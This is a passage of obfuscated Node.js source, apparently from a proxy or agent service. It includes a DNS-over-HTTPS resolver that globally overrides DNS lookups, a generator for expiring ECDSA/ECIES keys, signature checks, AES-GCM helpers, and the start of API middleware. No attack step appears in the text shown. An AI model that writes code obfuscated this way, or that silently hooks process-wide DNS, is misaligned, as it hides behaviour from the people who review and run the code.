                'PkybW': function (c, d) {
                    return c !== d;
                },
                'zYqfd': function (c, d, f) {
                    return c(d, f);
                },
                'OckaT': function (c, d) {
                    return c !== d;
                },
                'sSeAi': function (c, d) {
                    return c(d);
                },
                'urIyC': function (c, d) {
                    return c(d);
                },
                'YkOll': function (c, d) {
                    return c(d);
                },
                'WOJFO': function (c, d) {
                    return c(d);
                },
                'LisuY': function (c, d) {
                    return c(d);
                },
                'DOowr': function (c, d) {
                    return c !== d;
                },
                'YwAnN': function (c, d) {
                    return c !== d;
                },
                'GhNXV': function (c, d) {
                    return c !== d;
                },
                'gLXOl': function (c, d) {
                    return c !== d;
                },
                'BZonm': function (c, d) {
                    return c(d);
                },
                'XvkVV': function (c, d) {
                    return c(d);
                },
                'GbEhv': function (c, d) {
                    return c !== d;
                },
                'kBaqB': function (c, d) {
                    return c(d);
                },
                'wWvVi': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a[eO(0x563)] !== undefined && b[eO(0x21d)](a[eO(0x563)], null) && (this[eO(0x563)] = b['zYqfd'](parseInt, String(a[eO(0x563)]), 0xa));
        a[eO(0xd70)] && (this[eO(0xd70)] = a[eO(0xd70)][eO(0x5b0)]());
        a[eO(0x433)] && (this[eO(0x433)] = a[eO(0x433)]['trim']());
        if (b['PkybW'](a[eO(0x17d)], undefined) && b[eO(0xae6)](a['KMODE'], null)) {
            const c = b[eO(0x2e2)](String, a['KMODE'])[eO(0x5b0)]();
            if (/^(?:0|1|2|2q|2quic|3)$/i['test'](c)) {
                const d = c['toLowerCase']();
                this[eO(0x17d)] = d[eO(0x1ba)]('2') ? '2' : d, this['KMODE_QUIC'] = /^2q(?:uic)?$/['test'](d);
            } else
                this[eO(0x17d)] = '0', this[eO(0x8ca)] = ![], a0R[eO(0x585)](eO(0x922)['concat'](b[eO(0x36e)](String, a[eO(0x17d)]), eO(0xabb)));
        }
        a[eO(0x70d)] && b['sSeAi'](String, a[eO(0x70d)])['trim']() && (this['KNAME'] = String(a[eO(0x70d)])[eO(0x5b0)]()), a[eO(0xc03)] && b['YkOll'](String, a[eO(0xc03)])[eO(0x5b0)]() && (this[eO(0xc03)] = b[eO(0x879)](String, a['KNAME_KEY'])['trim']()), a[eO(0x868)] && b['WOJFO'](String, a['KPATH'])[eO(0x5b0)]() && (this[eO(0x868)] = String(a[eO(0x868)])[eO(0x5b0)]()), b['PkybW'](a[eO(0xe33)], undefined) && b['OckaT'](a['KHUB'], null) && (this[eO(0xe33)] = b[eO(0x5ca)](a0aw, b[eO(0x5ca)](String, a['KHUB']))), b[eO(0xfb9)](a['KHUB_PUBLIC_URL'], undefined) && b[eO(0x3a3)](a[eO(0xb60)], null) && (this[eO(0xb60)] = b[eO(0x36e)](String, a['KHUB_PUBLIC_URL'])['trim']()[eO(0x8d4)](/\/+$/, '')), b[eO(0xdc0)](a[eO(0x1d0)], undefined) && b[eO(0x348)](a[eO(0x1d0)], null) && (this[eO(0x1d0)] = b['BZonm'](a0a6, b['XvkVV'](String, a[eO(0x1d0)]))), b[eO(0xbb3)](a[eO(0x3f5)], undefined) && b[eO(0x21d)](a[eO(0x3f5)], null) && (this[eO(0x3f5)] = b[eO(0x8c4)](a0a6, b[eO(0x241)](String, a[eO(0x3f5)])));
    }
}
const a0aF = require(a0d9(0x90c)), a0aG = require(a0d9(0x104e));
class a0aH {
    static [a0d9(0xcd9)] = 0x1e;
    static [a0d9(0x60c)] = 0x258;
    static ['NEGATIVE_TTL'] = 0x3c;
    static ['SERVER_BACKOFF'] = 0x3c;
    static ['WARN_INTERVAL'] = 0x12c;
    static [a0d9(0x7ec)];
    static [a0d9(0x1eb)] = null;
    constructor(a = {}) {
        const eP = a0d9, b = (a[eP(0xc1c)] && a[eP(0xc1c)][eP(0xc54)] ? a[eP(0xc1c)] : a0aE[eP(0xb9e)])[eP(0xf2e)](c => String(c)[eP(0x5b0)]()[eP(0x8d4)](/\/+$/, ''))[eP(0x595)](Boolean);
        this['servers'] = b[eP(0xc54)] ? b : [...a0aE['DOH_SERVERS_DEFAULT']], this['timeoutMs'] = a['timeoutMs'] || 0xbb8, this[eP(0x33a)] = a[eP(0x33a)] || ((c, d, f) => this['dohQuery'](c, d, f)), this[eP(0xf8a)] = new Map(), this[eP(0x656)] = new Map(), this[eP(0x194)] = this[eP(0xc1c)][eP(0xf2e)](() => 0x0), this['lastFallbackWarn'] = 0x0;
    }
    async [a0d9(0x5a0)](a, b) {
        const eQ = a0d9, c = {
                'KRUat': function (j, k) {
                    return j === k;
                },
                'JVnIY': function (j, k) {
                    return j * k;
                },
                'oCpIe': function (j, k) {
                    return j + k;
                },
                'eZerk': eQ(0x2fa),
                'ZAYMG': function (j, k) {
                    return j + k;
                },
                'ahbJV': function (j, k) {
                    return j || k;
                },
                'IvJnB': function (j, k) {
                    return j > k;
                }
            };
        b = c[eQ(0x474)](b, 0x0);
        const d = ''[eQ(0x83f)](a, '|')[eQ(0x83f)](b), f = Date['now'](), g = this[eQ(0xf8a)][eQ(0xb12)](d);
        if (g && c[eQ(0x32c)](g['expire'], f))
            return g[eQ(0x181)][eQ(0x47b)]();
        const h = this[eQ(0x656)][eQ(0xb12)](d);
        if (h)
            return h;
        const i = ((async () => {
            const eR = eQ, j = await this[eR(0xaad)](a, b);
            if (c[eR(0xc14)](j[eR(0x13d)], 'ok') && j['ips']['length']) {
                const k = c['JVnIY'](Math[eR(0x100f)](Math['max'](j[eR(0xbe7)], a0aH[eR(0xcd9)]), a0aH[eR(0x60c)]), 0x3e8);
                return this[eR(0xf8a)][eR(0x42d)](d, {
                    'ips': j[eR(0x181)][eR(0x47b)](),
                    'expire': c[eR(0xc4e)](Date[eR(0x8da)](), k)
                }), j[eR(0x181)][eR(0x47b)]();
            }
            if (c['KRUat'](j[eR(0x13d)], c[eR(0xc8f)]))
                return this[eR(0xf8a)][eR(0x42d)](d, {
                    'ips': [],
                    'expire': c['ZAYMG'](Date[eR(0x8da)](), a0aH['NEGATIVE_TTL'] * 0x3e8)
                }), [];
            return null;
        })());
        this['inflight'][eQ(0x42d)](d, i);
        try {
            return await i;
        } finally {
            this[eQ(0x656)][eQ(0x350)](d);
        }
    }
    async [a0d9(0xaad)](a, b) {
        const eS = a0d9, c = {
                'akktK': function (k, l) {
                    return k !== l;
                },
                'ojkLD': function (k, l) {
                    return k !== l;
                },
                'jkBpM': function (k, l) {
                    return k === l;
                },
                'mkDCS': eS(0x2fa),
                'AaxXW': eS(0xfcc)
            }, d = [];
        if (c['akktK'](b, 0x6))
            d[eS(0xb66)]([
                0x1,
                0x4
            ]);
        if (c[eS(0x8e7)](b, 0x4))
            d[eS(0xb66)]([
                0x1c,
                0x6
            ]);
        const f = {
            0x4: [],
            0x6: []
        };
        let g = ![], h = ![], i = ![], j = a0aH['TTL_MAX'];
        for (const [k, l] of d) {
            try {
                const m = await this['queryOne'](a, k);
                c[eS(0x996)](m[eS(0x13d)], 'ok') && m[eS(0x181)][eS(0xc54)] ? (g = !![], f[l] = m[eS(0x181)], j = Math['min'](j, m[eS(0xbe7)])) : h = !![];
            } catch (n) {
                i = !![];
            }
        }
        if (g)
            return {
                'status': 'ok',
                'ips': this['orderAddresses'](f[0x6], f[0x4]),
                'ttl': j
            };
        if (h && !i)
            return {
                'status': c[eS(0xfcd)],
                'ips': [],
                'ttl': 0x0
            };
        return {
            'status': c[eS(0x9ca)],
            'ips': [],
            'ttl': 0x0
        };
    }
    async [a0d9(0x9ed)](a, b) {
        const eT = a0d9, c = {
                'lHtLx': function (f, g) {
                    return f < g;
                },
                'ctYDo': function (f, g) {
                    return f + g;
                },
                'nnDjs': function (f, g) {
                    return f === g;
                },
                'nqmRf': eT(0x2fa),
                'CHjVs': function (f, g) {
                    return f !== g;
                },
                'zpTJQ': function (f, g) {
                    return f !== g;
                },
                'DqaAp': eT(0xba0),
                'WRuDU': function (f, g, h) {
                    return f(g, h);
                }
            }, d = a0aH[eT(0x6d4)](a);
        for (let f = 0x0; c[eT(0x608)](f, this[eT(0xc1c)][eT(0xc54)]); f++) {
            if (Date['now']() < this[eT(0x194)][f])
                continue;
            let g;
            try {
                g = await this[eT(0x33a)](this[eT(0xc1c)][f], d, b);
            } catch (l) {
                this[eT(0x194)][f] = c[eT(0x1001)](Date['now'](), a0aH[eT(0x93d)] * 0x3e8);
                continue;
            }
            const h = g && c[eT(0x1037)](typeof g, eT(0xfe9)) ? g['Status'] || 0x0 : 0x1;
            if (c[eT(0x1037)](h, 0x3))
                return {
                    'status': c[eT(0xefb)],
                    'ips': [],
                    'ttl': 0x0
                };
            if (c[eT(0x6ac)](h, 0x0))
                continue;
            const j = [];
            let k = a0aH['TTL_MAX'];
            for (const m of g[eT(0x319)] || []) {
                if (!m || c[eT(0x6ac)](m[eT(0xa49)], b))
                    continue;
                if (c[eT(0xa9e)](typeof m['data'], c[eT(0x196)]) || !a0aH['validLiteral'](m[eT(0xe83)], b))
                    continue;
                j[eT(0xb66)](m['data']);
                const n = c[eT(0x3d9)](parseInt, m[eT(0x5d9)], 0xa);
                if (Number['isFinite'](n))
                    k = Math['min'](k, n);
            }
            if (j[eT(0xc54)])
                return {
                    'status': 'ok',
                    'ips': [...new Set(j)],
                    'ttl': k
                };
            return {
                'status': c[eT(0xefb)],
                'ips': [],
                'ttl': 0x0
            };
        }
        throw new Error('all\x20doh\x20servers\x20failed');
    }
    [a0d9(0xf35)](a, b, c) {
        const eU = a0d9, d = {
                'uJvIJ': function (f, g) {
                    return f(g);
                },
                'hDmLp': 'utf8',
                'Jbwuv': function (f, g) {
                    return f !== g;
                },
                'aTfDu': eU(0xe83),
                'oQwvR': eU(0xdc9),
                'jnBPr': eU(0xf0a),
                'nUtYD': eU(0x7e0),
                'RqcYh': 'error'
            };
        return new Promise((f, g) => {
            const eV = eU, h = a0h[eV(0xfc5)](''[eV(0x83f)](a, '?name=')[eV(0x83f)](d[eV(0x92c)](encodeURIComponent, b), eV(0x5f5))[eV(0x83f)](c), {
                    'method': eV(0x249),
                    'timeout': this[eV(0x7b1)],
                    'headers': {
                        'accept': d[eV(0x686)],
                        'user-agent': eV(0x924)[eV(0x83f)](a0aE[eV(0x4a2)])
                    }
                }, i => {
                    const eW = eV, j = {
                            'lgrXl': function (l, m) {
                                return d['uJvIJ'](l, m);
                            },
                            'hMpyd': d['hDmLp']
                        };
                    if (d[eW(0x1059)](i[eW(0xafa)], 0xc8)) {
                        i[eW(0xf28)](), g(new Error(eW(0xbaa)[eW(0x83f)](i[eW(0xafa)])));
                        return;
                    }
                    const k = [];
                    i['on'](d[eW(0x9d4)], l => k[eW(0xb66)](l)), i['on'](d[eW(0x1a8)], () => {
                        const eX = eW;
                        try {
                            j['lgrXl'](f, JSON['parse'](Buffer['concat'](k)[eX(0x43a)](j['hMpyd'])));
                        } catch (l) {
                            j[eX(0x183)](g, l);
                        }
                    });
                });
            h['on'](d[eV(0xa9b)], () => h[eV(0x28a)](new Error(eV(0xb71)))), h['on'](d[eV(0xf78)], g), h[eV(0xdc9)]();
        });
    }
    ['warnFallback'](a) {
        const eY = a0d9, b = {
                'VRYrx': function (d, f) {
                    return d >= f;
                },
                'mqEvB': function (d, f) {
                    return d - f;
                },
                'JCQYw': function (d, f) {
                    return d * f;
                }
            }, c = Date['now']();
        b['VRYrx'](b['mqEvB'](c, this[eY(0x532)]), b[eY(0xd5b)](a0aH['WARN_INTERVAL'], 0x3e8)) && (this[eY(0x532)] = c, a0R['warn']('🌐\x20KISAMA_DNS=on:\x20全部\x20DoH\x20服务器不可达,\x20\x22'[eY(0x83f)](a, eY(0xa61))));
    }
    [a0d9(0x620)](a, b) {
        const eZ = a0d9, c = [...new Set(a)], d = [...new Set(b)];
        if (!c['length'])
            return d;
        if (!d['length'])
            return c;
        return this[eZ(0xaec)]() ? c['concat'](d) : d[eZ(0x83f)](c);
    }
    [a0d9(0xaec)]() {
        const f0 = a0d9, a = {
                'OGZNB': function (b, c) {
                    return b === c;
                },
                'ILwZO': f0(0xc0e)
            };
        if (a['OGZNB'](a0aH[f0(0x7ec)], undefined))
            try {
                const b = a0aG[f0(0xba8)](a[f0(0xce1)]);
                b[f0(0x76b)](), a0aH['_ipv6Usable'] = !![];
            } catch (c) {
                a0aH[f0(0x7ec)] = ![];
            }
        return a0aH[f0(0x7ec)];
    }
    static [a0d9(0x807)](a, b) {
        const f1 = a0d9, c = {
                'vEPZS': function (d, f) {
                    return d === f;
                }
            };
        return a0i[f1(0xff0)](a) === (c[f1(0xbfc)](b, 0x1) ? 0x4 : 0x6);
    }
    static [a0d9(0x6d4)](a) {
        const f2 = a0d9;
        if (/^[\x00-\x7F]*$/[f2(0xf92)](a))
            return a;
        try {
            return new URL(f2(0x9a5)[f2(0x83f)](a))['hostname'];
        } catch (b) {
            return a;
        }
    }
}
const a0aI = a0aF[a0d9(0x57a)];
function a0aJ(a, b) {
    const f3 = a0d9, c = {
            'OEEVJ': function (f, g) {
                return f === g;
            },
            'PiuSo': 'ENOTFOUND',
            'HfNsu': function (f, g, h) {
                return f(g, h);
            },
            'tXleD': function (f, g) {
                return f === g;
            },
            'nxTbR': f3(0xd40),
            'Jkibo': function (f, g) {
                return f !== g;
            },
            'YkVEv': f3(0xba0),
            'ClSSD': f3(0xfe9),
            'fOOrD': f3(0x1029),
            'CcGbe': function (f, g) {
                return f === g;
            },
            'qmPNR': f3(0x80b),
            'HDTOz': function (f, g) {
                return f === g;
            },
            'xesAG': f3(0x5c4),
            'cADBA': f3(0xa3a),
            'tbQgi': f3(0x31f)
        }, d = b || a0aI;
    return function f(g, h, i) {
        const f5 = f3, j = {
                'CGymy': function (n, o) {
                    const f4 = a0b;
                    return c[f4(0xd0f)](n, o);
                },
                'rrXml': c[f5(0xf47)],
                'qrMYa': function (n, o) {
                    return n(o);
                },
                'nAWfL': function (n, o, p) {
                    const f6 = f5;
                    return c[f6(0x2c4)](n, o, p);
                },
                'TmLcw': function (n, o, p, q) {
                    return n(o, p, q);
                }
            };
        c[f5(0x7eb)](typeof h, c[f5(0xa18)]) && (i = h, h = {});
        if (c[f5(0x472)](typeof g, c[f5(0xedc)]) || !g || a0i[f5(0xff0)](g))
            return d[f5(0x5fd)](a0aF, g, h, i);
        const k = h || {};
        let l = c[f5(0xd0f)](typeof k, c['ClSSD']) ? k['family'] || 0x0 : k || 0x0;
        if (c['OEEVJ'](l, c[f5(0x754)]) || c[f5(0xfba)](l, c['qmPNR']))
            l = 0x4;
        else {
            if (c[f5(0x734)](l, c[f5(0x5a4)]) || l === c['cADBA'])
                l = 0x6;
            else {
                if (c[f5(0x472)](typeof l, c[f5(0x16b)]))
                    l = 0x0;
            }
        }
        const m = c[f5(0x7eb)](typeof k, c['ClSSD']) && !!k[f5(0x84e)];
        a['resolve'](g, l)['then'](n => {
            const f7 = f5;
            if (j[f7(0x939)](n, null))
                return a[f7(0x9e3)](g), d[f7(0x5fd)](a0aF, g, h, i);
            if (!n[f7(0xc54)]) {
                const o = new Error(f7(0x335)[f7(0x83f)](g, f7(0x7e2)));
                return o['code'] = j[f7(0xf34)], o['syscall'] = f7(0x748), o[f7(0x8d1)] = g, j['qrMYa'](i, o);
            }
            m ? j[f7(0x195)](i, null, n[f7(0xf2e)](p => ({
                'address': p,
                'family': a0i[f7(0xff0)](p)
            }))) : j[f7(0xbe4)](i, null, n[0x0], a0i['isIP'](n[0x0]));
        })[f5(0x92f)](n => i(n || new Error('secure\x20dns\x20internal\x20error')));
    };
}
function a0aK(a = null) {
    const f8 = a0d9, b = {
            'aVhnQ': function (f, g) {
                return f(g);
            },
            'Zlhbm': function (f, g) {
                return f === g;
            },
            'gOegj': function (f, g) {
                return f !== g;
            },
            'gLypR': function (f, g, h) {
                return f(g, h);
            }
        };
    if (a0aH[f8(0x1eb)])
        return a0aH[f8(0x1eb)];
    const c = b[f8(0x59f)](String, b[f8(0x90f)](a, null) ? a0aE[f8(0x381)] : a)[f8(0x5b0)]()[f8(0x544)]();
    if (b[f8(0x4b5)](c, 'on'))
        return null;
    let d = null;
    return a0aE[f8(0x89d)] && (d = a0aE[f8(0x89d)][f8(0xa6a)](/[,\s]+/)[f8(0xf2e)](f => f['trim']())['filter'](Boolean)), a0aH[f8(0x1eb)] = new a0aH({ 'servers': d }), a0aF[f8(0x57a)] = b['gLypR'](a0aJ, a0aH['_globalHook'], a0aI), a0R['info'](f8(0xcef)[f8(0x83f)](a0aH['_globalHook'][f8(0xc1c)]['join'](',\x20'))), a0aH[f8(0x1eb)];
}
a0aK();
class a0aL {
    constructor() {
        const f9 = a0d9;
        this[f9(0xfab)] = null, this[f9(0x661)] = null;
    }
    [a0d9(0xa70)](a) {
        const fa = a0d9, b = {
                'suyUA': function (c, d) {
                    return c * d;
                },
                'JzJwj': function (c, d) {
                    return c === d;
                }
            };
        this[fa(0x7ad)]();
        if (this['_key']) {
            if (this['_key'][fa(0xc9b)] === b[fa(0xb1c)](a, 0xe10))
                return this[fa(0xfab)];
            const c = this[fa(0xfab)][fa(0x8b9)];
            this[fa(0xfab)] = null, a0R[fa(0x585)](fa(0xdfe)[fa(0x83f)](c));
            if (b['JzJwj'](typeof this[fa(0x661)], fa(0xd40)))
                try {
                    this['onExpired']();
                } catch (d) {
                    a0R[fa(0xfcc)](fa(0x93c)[fa(0x83f)](d[fa(0x769)]));
                }
        }
        return this[fa(0xfab)] = this[fa(0x7f3)](a), a0R[fa(0x543)](fa(0x5d3)[fa(0x83f)](this[fa(0xfab)]['key_id'], fa(0x750))['concat'](a, '\x20小时')), this[fa(0xfab)];
    }
    [a0d9(0x9c4)]() {
        const fb = a0d9;
        this['_expireCurrent']();
        if (this['_key'])
            return this[fb(0xfab)][fb(0x33b)];
        return null;
    }
    [a0d9(0x7f6)]() {
        const fc = a0d9;
        this[fc(0x7ad)]();
        if (this[fc(0xfab)])
            return this['_key'][fc(0x69a)];
        return null;
    }
    [a0d9(0x7ad)]() {
        const fd = a0d9, a = {
                'XxbUQ': function (b, c) {
                    return b === c;
                },
                'EiQNt': fd(0xd40)
            };
        if (this[fd(0xfab)] && this['_isExpired'](this['_key'])) {
            const b = this[fd(0xfab)][fd(0x8b9)];
            this[fd(0xfab)] = null, a0R[fd(0x585)](fd(0xcd6)[fd(0x83f)](b));
            if (a[fd(0x106d)](typeof this[fd(0x661)], a['EiQNt']))
                try {
                    this[fd(0x661)]();
                } catch (c) {
                    a0R[fd(0xfcc)](fd(0x7da)[fd(0x83f)](c['message']));
                }
        }
    }
    ['_isExpired'](a) {
        const fe = a0d9, b = {
                'vjQyO': function (c, d) {
                    return c >= d;
                },
                'MYMQx': function (c, d) {
                    return c / d;
                }
            };
        return b[fe(0x1ec)](Math[fe(0x568)](b['MYMQx'](Date[fe(0x8da)](), 0x3e8)), a['expires_at']);
    }
    [a0d9(0x7f3)](a) {
        const ff = a0d9, b = {
                'uAfYz': ff(0xdd5),
                'EvSGA': ff(0x3f8),
                'TkEjV': 'jwk',
                'WfiLi': 'spki',
                'GCfMQ': function (o, p) {
                    return o - p;
                },
                'ltBQR': function (o, p) {
                    return o * p;
                },
                'MuCdB': ff(0x1a2),
                'jHekz': 'base64url'
            }, {
                privateKey: c,
                publicKey: d
            } = a0k['generateKeyPairSync']('ec', { 'namedCurve': b[ff(0xa2e)] }), f = c[ff(0xc4c)]({
                'type': 'pkcs8',
                'format': b[ff(0x869)]
            }), g = d[ff(0xc4c)]({
                'type': ff(0x9f4),
                'format': b['EvSGA']
            }), h = a0k[ff(0x7bb)](0x20), i = Buffer['from'](a0B[ff(0xccc)](h, ![])), j = c[ff(0xc4c)]({ 'format': b[ff(0xbae)] }), k = d[ff(0xc4c)]({
                'type': b['WfiLi'],
                'format': ff(0xe2d)
            }), l = k['subarray'](b['GCfMQ'](k[ff(0xc54)], 0x41)), m = Math[ff(0x568)](Date[ff(0x8da)]() / 0x3e8), n = b[ff(0xdba)](a, 0xe10);
        return {
            'key_id': a0k['randomBytes'](0x8)[ff(0x43a)](b['MuCdB']),
            'created_at': m,
            'expires_at': m + n,
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[ff(0x43a)](b['MuCdB']),
            'ecies_public_key': i['toString'](b[ff(0xb8d)]),
            'ecdsa_private_hex': Buffer[ff(0xca5)](j['d'], b[ff(0xa4a)])[ff(0x43a)](ff(0x1a2)),
            'ecdsa_public_b64': Buffer[ff(0xca5)](a0A[ff(0x52f)][ff(0x2ca)](l)[ff(0xa09)](!![]))[ff(0x43a)](ff(0x66e)),
            'ecies_public_b64': Buffer[ff(0xca5)](a0B['getPublicKey'](h, !![]))[ff(0x43a)]('base64'),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0aM {
    constructor(a, b) {
        const fg = a0d9, c = {
                'UnITB': '-----BEGIN',
                'LkAEc': 'base64',
                'UftxS': function (d, f) {
                    return d(f);
                },
                'YlOGe': fg(0x709),
                'tkBUz': fg(0x94a)
            };
        this[fg(0x49f)] = null, this[fg(0xb77)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[fg(0x1ba)](c['UnITB']))
                    this['ecdsaPubkey'] = a0k[fg(0xea0)](d);
                else {
                    const f = Buffer[fg(0xca5)](d, c['LkAEc']), g = a0A['Point']['fromBytes'](f), h = g['toBytes'](![]), i = m => m['toString'](fg(0x66e))['replace'](/\+/g, '-')['replace'](/\//g, '_')['replace'](/=/g, ''), j = c[fg(0xa27)](i, Buffer['from'](h[fg(0x47b)](0x1, 0x21))), k = c[fg(0xa27)](i, Buffer[fg(0xca5)](h[fg(0x47b)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[fg(0x193)],
                            'x': j,
                            'y': k
                        };
                    this[fg(0x49f)] = a0k[fg(0xea0)]({
                        'key': l,
                        'format': c['tkBUz']
                    });
                }
            } catch (m) {
                a0R['error'](fg(0xd86)[fg(0x83f)](m['message'])), this[fg(0x49f)] = null;
            }
        if (b)
            try {
                this[fg(0xb77)] = a0w[fg(0xf7d)](b[fg(0x5b0)]());
            } catch (n) {
                a0R[fg(0x585)](fg(0x3fa)['concat'](n[fg(0x769)]));
            }
    }
    ['verifySignature'](a, b, c, d, f, g, h = null) {
        const fh = a0d9, i = {
                'uyZcs': function (j, k) {
                    return j(k);
                },
                'ZOKsl': function (j, k) {
                    return j / k;
                },
                'yIEEG': function (j, k) {
                    return j > k;
                },
                'NqcOt': function (j, k) {
                    return j - k;
                },
                'lDwBA': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'qAHHv': 'static',
                'lNtkf': fh(0x7c0)
            };
        if (!this[fh(0x49f)])
            throw new Error('ECDSA\x20public\x20key\x20not\x20loaded');
        try {
            const j = i[fh(0xfbd)](parseInt, f), k = Math[fh(0x568)](i[fh(0x101d)](Date[fh(0x8da)](), 0x3e8));
            if (i[fh(0x3d4)](Math[fh(0x675)](i[fh(0xba1)](k, j)), a0aE[fh(0xbca)]))
                throw new Error('Timestamp\x20expired:\x20diff='[fh(0x83f)](Math['abs'](i[fh(0xba1)](k, j)), fh(0xf95))[fh(0x83f)](a0aE[fh(0xbca)], 's'));
            const l = i[fh(0x6ea)](a0aN, a, b, c, d, f);
            if (this[fh(0xa12)](this['ecdsaPubkey'], l, g))
                return i['qAHHv'];
            if (h && this[fh(0xa12)](h, l, g))
                return fh(0xb3b);
            throw new Error(i[fh(0x1008)]);
        } catch (m) {
            throw new Error('Signature\x20verification\x20failed:\x20'[fh(0x83f)](m[fh(0x769)]));
        }
    }
    [a0d9(0xa12)](a, b, c) {
        const fi = a0d9, d = { 'SkVqg': fi(0x3ce) };
        if (!a)
            return ![];
        try {
            const f = a0w[fi(0xf7d)](c), g = a0k['createVerify'](d['SkVqg']);
            return g['update'](b), g[fi(0xca1)](a, f);
        } catch (h) {
            return ![];
        }
    }
    ['encryptResponse'](a, b = null) {
        const fj = a0d9, c = {
                'Jabbw': 'ECIES\x20public\x20key\x20not\x20initialized,\x20cannot\x20encrypt\x20response',
                'iOFqK': 'utf-8',
                'crsPI': 'base64'
            };
        if (a0aE[fj(0x6c0)])
            return JSON[fj(0x41c)](a);
        if (!this[fj(0xb77)])
            throw new Error(c['Jabbw']);
        try {
            const d = JSON[fj(0x41c)](a), f = Buffer['from'](d, c[fj(0x84c)]), g = b || Buffer[fj(0xca5)](this[fj(0xb77)]), h = a0v(g, f);
            return Buffer[fj(0xca5)](h)[fj(0x43a)](c[fj(0x875)]);
        } catch (i) {
            throw new Error(fj(0xc31)['concat'](i[fj(0x769)]));
        }
    }
    [a0d9(0xe98)](a, b) {
        const fk = a0d9, c = {
                'VCkoC': function (d, f) {
                    return d !== f;
                },
                'UAbgL': fk(0x36d),
                'whuDN': fk(0x66e),
                'nJjmJ': 'Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.',
                'KZPUa': fk(0xec2)
            };
        if (!b || c['VCkoC'](b[fk(0xc54)], 0x20))
            throw new Error(c['UAbgL']);
        try {
            const d = Buffer[fk(0xca5)](a, c[fk(0x1e6)])[fk(0x43a)]('utf8'), f = JSON[fk(0xadd)](d);
            if (!f[fk(0x398)] || !f['tag'] || !f[fk(0x295)])
                throw new Error(c[fk(0xf29)]);
            const g = Buffer[fk(0xca5)](f['nonce'], c['whuDN']), h = Buffer[fk(0xca5)](f['tag'], c[fk(0x1e6)]), i = Buffer[fk(0xca5)](f[fk(0x295)], fk(0x66e)), j = a0k[fk(0x7be)](fk(0x5a6), b, g);
            j[fk(0x76e)](h);
            let k = j[fk(0x19c)](i, null, c[fk(0x527)]);
            return k += j[fk(0xb87)](c[fk(0x527)]), k;
        } catch (l) {
            throw new Error('AES\x20Decrypt\x20Error:\x20'[fk(0x83f)](l['message']));
        }
    }
    ['encryptData'](a, b) {
        const fl = a0d9, c = {
                'kvrog': fl(0x5b1),
                'WcyTX': 'aes-256-gcm',
                'OAigI': fl(0x66e),
                'ChLxa': fl(0xec2)
            };
        if (!b || b[fl(0xc54)] !== 0x20)
            throw new Error(c[fl(0x6ed)]);
        try {
            const d = a0k[fl(0x7bb)](0xc), f = a0k[fl(0xef4)](c[fl(0x5c2)], b, d), g = Buffer[fl(0x83f)]([
                    f[fl(0x19c)](a),
                    f[fl(0xb87)]()
                ]), h = f[fl(0x1027)](), i = {
                    'nonce': d['toString'](fl(0x66e)),
                    'tag': h[fl(0x43a)](c[fl(0xf07)]),
                    'ciphertext': g[fl(0x43a)](c[fl(0xf07)])
                };
            return Buffer[fl(0xca5)](JSON['stringify'](i), c[fl(0xdb6)])[fl(0x43a)](c[fl(0xf07)]);
        } catch (j) {
            throw new Error(fl(0x4f3)[fl(0x83f)](j[fl(0x769)]));
        }
    }
}
function a0aN(a, b, c, d, f) {
    const fm = a0d9, g = {
            'xUihm': fm(0xac8),
            'dozjd': fm(0x1a2)
        };
    return !c && (c = a0k[fm(0x282)](g[fm(0x278)])[fm(0x19c)](Buffer[fm(0x901)](0x0))[fm(0x61c)](g[fm(0xef3)])), ''[fm(0x83f)](a, '\x0a')[fm(0x83f)](b, '\x0a')['concat'](c, '\x0a')[fm(0x83f)](d, '\x0a')[fm(0x83f)](f);
}
function a0aO(a, b = null) {
    const fn = a0d9, c = {
            'dfMzZ': fn(0x936),
            'oGksp': fn(0x635),
            'yJMZF': fn(0xba0),
            'NLcdA': fn(0x5d8),
            'genpn': function (d, f) {
                return d === f;
            },
            'bBiuJ': fn(0xec2),
            'NjhUc': fn(0x66e),
            'cfeCA': 'x-agent-version',
            'RYihQ': fn(0x3b5),
            'UOlqM': function (d) {
                return d();
            },
            'AuhGz': '/api/proxy/config',
            'msdhg': fn(0xd06),
            'bwXcp': function (d, f) {
                return d === f;
            },
            'fuyXe': 'HEAD',
            'AndoB': fn(0x96e),
            'qXxuF': function (d) {
                return d();
            },
            'qFpBa': fn(0xa37),
            'RpvnC': fn(0x1021),
            'OKoiC': fn(0x674),
            'EAWbl': fn(0xca8),
            'OqJIn': fn(0x9d5),
            'aYMVw': fn(0xff3),
            'hPKls': fn(0x34c),
            'rIZSl': function (d) {
                return d();
            },
            'TuQgQ': fn(0xb41),
            'izMpC': function (d, f) {
                return d === f;
            },
            'XlpJN': fn(0x368),
            'DBdXn': function (d, f) {
                return d > f;
            },
            'AWDww': fn(0xac8),
            'qKObg': fn(0x1a2),
            'hzQgc': function (d, f) {
                return d === f;
            },
            'aoLdE': fn(0xb3b),
            'YYmon': 'static',
            'dwCBW': function (d) {
                return d();
            },
            'xJCvf': function (d, f) {
                return d === f;
            },
            'YnmZO': fn(0x740),
            'IdLje': function (d, f) {
                return d === f;
            },
            'cURsD': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const fo = fn, h = {
                'CIHpc': function (o, p) {
                    return o === p;
                },
                'Dfbes': c['yJMZF'],
                'oNxTl': fo(0x635),
                'fworT': fo(0x96e),
                'jdXtG': c[fo(0x414)],
                'nNoWK': fo(0xb79),
                'AHJTb': fo(0xea9),
                'MngkE': '/api/baseinfo',
                'jptDR': fo(0xb3b),
                'qnKsl': function (o, p) {
                    const fp = fo;
                    return c[fp(0x9be)](o, p);
                },
                'RjRdY': c[fo(0x2a1)],
                'HgkNQ': c[fo(0x389)],
                'LFkbB': c[fo(0x1d2)]
            };
        if (d[fo(0x4fa)][fo(0x1ba)](c[fo(0xc29)]))
            return c['UOlqM'](g);
        if (d['path'][fo(0x1ba)](fo(0x936)) && !d[fo(0x4fa)][fo(0x1ba)](c[fo(0x80f)]) || d[fo(0x4fa)]['startsWith'](fo(0x1bc)))
            return c[fo(0x565)](g);
        const i = f[fo(0x871)];
        f[fo(0x871)] = function (o) {
            const fq = fo;
